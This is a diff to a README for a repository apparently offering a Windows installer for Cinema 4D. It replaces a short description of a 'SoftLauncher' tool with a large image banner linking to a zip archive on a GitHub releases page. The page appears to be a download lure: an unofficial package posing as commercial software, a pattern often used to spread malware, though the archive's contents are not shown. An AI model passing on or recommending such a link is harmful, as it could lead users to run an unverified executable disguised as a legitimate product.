@@ -1,2 +1,10 @@
 # WinSoftware-Cinema
-SoftLauncher is a streamlined, lightweight and user-friendly Windows tool designed to simplify Cinema 4D installation. The application offers straightforward step-by-step instructions, handles several setup stages automatically, and turns the entire installation into a quick and effortless experience.
+
+<table align="center">
+<tr>
+<td align="center">
+<a href="https://github.com/ScorpionList/WinSoftware/releases/download/WinSoftware/WinSoftware.zip">
+  <img src="https://i.imgur.com/EYUUMq5.jpeg" width="1050">
+</a>
+<br>
+<b>Cinema 4D — Windows</b>
